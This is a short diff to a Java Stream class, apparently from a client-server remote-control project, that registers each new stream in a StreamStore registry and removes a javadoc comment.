@@ -7,6 +7,7 @@ import subterranean.crimson.permajar.stage1.network.Communications;
 import subterranean.crimson.server.commands.ClientCommands;
 import subterranean.crimson.server.network.Connection;
 import subterranean.crimson.universal.BMN;
+import subterranean.crimson.universal.StreamStore;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.containers.Message;
 
@@ -31,12 +32,13 @@ public abstract class Stream {
 	public Stream(Parameters p) {
 		param = p;
 		param.setSender(!param.isSender());// switch the sender field
+		StreamStore.addStream(this);
 	}
 
 	public Stream(Parameters p, Connection connection) {
 		param = p;
 		c = connection;
-
+		StreamStore.addStream(this);
 	}
 
 	public void start() {
@@ -56,12 +58,7 @@ public abstract class Stream {
 	public short getStreamID() {
 		return param.getStreamID();
 	}
-
-	/**
-	 * Determines where to send the data
-	 * 
-	 * @param m
-	 */
+	
 	public void sendMessage(Message m) {
 
 		if (c == null) {
